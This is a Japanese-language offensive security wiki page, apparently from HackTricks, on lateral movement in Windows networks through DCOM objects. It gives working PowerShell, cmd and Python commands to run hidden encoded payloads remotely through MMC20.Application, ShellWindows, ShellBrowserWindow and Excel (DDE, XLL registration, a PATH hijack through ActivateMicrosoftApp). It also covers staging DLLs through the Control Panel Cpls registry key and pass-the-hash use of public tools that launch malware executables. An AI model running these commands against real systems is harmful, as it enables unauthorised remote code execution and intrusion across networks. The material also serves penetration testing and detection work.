# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement は、service や scheduled task を作成せず、RPC/DCOM 経由で公開されている既存の COM server を再利用できるため魅力的です。実際には、最初の接続は通常 TCP/135 で開始し、その後、動的に割り当てられた高番ポートの RPC に移行します。

## 前提条件と注意点

- 通常、target 上で local administrator のコンテキストが必要で、remote COM server がリモートからの launch/activation を許可している必要があります。
- **2023 年 3 月 14 日**以降、Microsoft はサポート対象システムに対して DCOM hardening を適用しています。低い activation authentication level を要求する古い client は、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` をネゴシエートしないと失敗する場合があります。最新の Windows client では通常、自動的に引き上げられるため、現在の tooling は通常そのまま動作します。<sup>[[3]](#references)</sup>
- 手動または script による DCOM execution では、通常 TCP/135 と target の動的 RPC port range が必要です。Impacket の `dcomexec.py` を使用して command output を取得する場合は、通常 `ADMIN$`（または読み書き可能な別の share）への SMB access も必要です。
- RPC/DCOM が動作していても SMB が blocked されている場合、`dcomexec.py -nooutput` による blind execution が役立つことがあります。

簡単な確認方法:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

この手法の詳細については、[元の MMC20.Application の投稿](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)を参照してください。<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) オブジェクトは、ネットワーク経由でオブジェクトとやり取りするための興味深い機能を備えています。Microsoft は DCOM と Component Object Model (COM) の両方について包括的なドキュメントを提供しており、[こちらが DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)、[こちらが COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) のドキュメントです。PowerShell コマンドを使用すると、DCOM アプリケーションの一覧を取得できます。

```bash
Get-CimInstance Win32_DCOMApplication
```

COM オブジェクトの [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) を使うと、MMC snap-in の操作をスクリプトで実行できます。特に、このオブジェクトには `Document.ActiveView` 配下に `ExecuteShellCommand` メソッドがあります。このメソッドの詳細は[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)で確認できます。実行して確認します:<sup>[[6]](#references)</sup>

この機能を使うと、DCOM application 経由でネットワーク上のコマンドを実行できます。管理者としてリモートから DCOM を操作するには、次のように PowerShell を使用できます。

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

このコマンドはDCOMアプリケーションに接続し、COMオブジェクトのインスタンスを返します。その後、ExecuteShellCommandメソッドを呼び出して、リモートホスト上でプロセスを実行できます。処理は次の手順で行われます。

メソッドを確認します。

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

RCEを取得:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

最後の引数はウィンドウスタイルです。`7`を指定すると、ウィンドウは最小化されたままになります。実際の運用では、MMCベースの実行では通常、リモートの`mmc.exe`プロセスがpayloadを起動します。これは、以下のExplorerベースのオブジェクトとは異なります。

## ShellWindows & ShellBrowserWindow

**この手法の詳細については、元の記事 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) を確認してください。**<sup>[[2]](#references)</sup>

**MMC20.Application**オブジェクトには、アプリケーション固有の`LaunchPermission`値が設定されていないことが確認されています。<sup>[[2]](#references)</sup> ただし、これだけでアクセスが許可されるわけではありません。COMは、該当する場合、マシンの`DefaultLaunchPermission` ACLとマシン全体の起動・アクセス制限を確認します。<sup>[[9]](#references)[[10]](#references)</sup> 詳細については[こちら](https://twitter.com/tiraniddo/status/817532039771525120)のスレッドを参照できます。また、明示的なLaunch Permissionが設定されていないオブジェクトをフィルタリングするには、[@tiraniddo](https://twitter.com/tiraniddo)のOleView .NETを使うことが推奨されています。

`ShellBrowserWindow`と`ShellWindows`という2つのオブジェクトは、明示的なLaunch Permissionsが設定されていないことから注目されました。<sup>[[2]](#references)</sup> `HKCR:\AppID\{guid}`に`LaunchPermission`値が存在しない場合、アプリケーション固有の起動ACLがないことを意味しますが、リモートアクティベーションが無制限に許可されるという意味ではありません。<sup>[[9]](#references)[[10]](#references)</sup>

`MMC20.Application`と比べると、これらのオブジェクトはOPSECの観点で目立ちにくいことがよくあります。これは、コマンドの実行プロセスが、リモートホスト上で`mmc.exe`ではなく`explorer.exe`の子プロセスになることが多いためです。

### ShellWindows

ProgIDがない`ShellWindows`では、.NETのメソッド`Type.GetTypeFromCLSID`と`Activator.CreateInstance`を使って、CLSIDからオブジェクトをインスタンス化できます。この処理ではOleView .NETを使って`ShellWindows`のCLSIDを取得します。インスタンス化した後、`WindowsShell.Item`メソッドを介して操作でき、`Document.Application.ShellExecute`のようなメソッドを呼び出せます。<sup>[[2]](#references)</sup>

オブジェクトをインスタンス化し、リモートでコマンドを実行するPowerShellコマンドの例を以下に示します。

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow`も同様ですが、CLSIDを使って直接インスタンス化し、`Document.Application.ShellExecute`へとピボットできます。

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Excel DCOM Objectsを使用したLateral Movement

DCOM Excel objectsを悪用することで、lateral movementを実現できます。詳しい情報については、DCOM経由でlateral movementを行うためにExcel DDEを活用する方法についての[Cybereasonのブログ](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)を読むことをおすすめします。<sup>[[5]](#references)</sup>

Empireプロジェクトには、DCOM objectsを操作してExcelをremote code execution (RCE)に利用する方法を示すPowerShell scriptが用意されています。以下は、Excelを悪用してRCEを行うさまざまな方法を紹介する、[EmpireのGitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)にあるscriptの抜粋です。

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

最近の研究では、`Excel.Application` の `ActivateMicrosoftApp()` メソッドを使って、この手法の範囲が広がりました。重要なポイントは、Excel がシステムの `PATH` を検索し、FoxPro、Schedule Plus、Project などの旧 Microsoft アプリケーションを起動しようとすることです。攻撃者が、対象の `PATH` に含まれる書き込み可能な場所に、想定される名前の payload を配置できれば、Excel がそれを実行します。<sup>[[4]](#references)</sup>

この手法に必要な条件:

- 対象でのローカル管理者権限
- 対象への Excel のインストール
- 対象の `PATH` に含まれる書き込み可能なディレクトリへの payload の書き込み権限

FoxPro の検索を悪用する実用例（`FOXPROW.exe`）:

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

攻撃側ホストにローカルの `Excel.Application` ProgID が登録されていない場合は、代わりに CLSID を指定してリモートオブジェクトをインスタンス化します。

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

実際に悪用されている値:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 登録済みの Control Panel DLL の読み込み

`COpenControlPanel` クラス（CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`）は、`IOpenControlPanel`（IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`）を公開します。その `Open()` メソッドを呼び出すと、`Control Panel\Cpls` キーに登録された Control Panel DLL が、リモートの `dllhost.exe` によって読み込まれます。テストしたシステムでは、このクラスに明示的な起動/アクセス許可が設定されていないため、既定の DCOM ポリシーが適用されます（通常、リモートでのアクティベーションには管理者権限が必要です）。ランダムな項目名を指定するだけで `Open()` に登録済み DLL を処理させることができます。ペイロードに `.cpl` 拡張子は不要ですが、正しいアーキテクチャの有効な DLL である必要があります。<sup>[[7]](#references)</sup>

このプリミティブは、コマンドのみを実行するのではなく、**stage-and-trigger** 方式です。まず DLL をターゲットにコピーし、それを指す `REG_EXPAND_SZ` 値を作成してから、DCOM 経由でオブジェクトをアクティベートします。たとえば、管理者権限の Windows コンテキストから次のように実行します。<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

公開されている [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client は、Impacket を使用して未公開の DCOM call を実装しています。任意の Control Panel item name を指定するだけで十分です。`dllhost.exe` が DLL をロードしていても、client は RPC error を報告することがあります。<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

運用上、この経路にはファイル書き込み経路とリモートレジストリアクセスも必要なため、`MMC20`/`ShellWindows`よりも痕跡が目立ちます。後でコントロールパネルを開いたときに同じエントリが再び読み込まれるため、永続化の副作用も発生します。実行後に値を削除し、不審な`Control Panel\Cpls`の値と`dllhost.exe`での異常なDLL読み込みを併せて調査してください。<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### 横展開の自動化ツール

これらの手法を自動化するツールを2つ紹介します。

- **Invoke-DCOM.ps1**: Empire project が提供する PowerShell script で、リモートマシン上でコードを実行するさまざまな方法を簡単に呼び出せます。この script は Empire GitHub repository から入手できます。

- **SharpLateral**: リモートでコードを実行するためのツールで、次のコマンドで使用できます。

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## 自動ツール

- Powershell スクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) を使うと、他のマシンでコードを実行するためのコメントアウトされたすべての方法を簡単に呼び出せます。
- Impacket の `dcomexec.py` を使うと、DCOM 経由でリモートシステム上のコマンドを実行できます。現在のビルドでは `ShellWindows`、`ShellBrowserWindow`、`MMC20` がサポートされており、デフォルトでは `ShellWindows` が使用されます。

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- [**SharpLateral**](https://github.com/mertdas/SharpLateral)も使用できます。

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [**SharpMove**](https://github.com/0xthirteen/SharpMove)を使用することもできます。

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [MMC20.Application COM Objectを使用したLateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM経由のLateral Movement：ラウンド2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414)の変更を管理する](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement：DCOM Excel Applicationの力を悪用する](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM経由のLateral MovementにExcel DDEを活用する](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [リモートコマンド実行にDCOM objectsを使用する](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM：付録B、製品の動作 - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
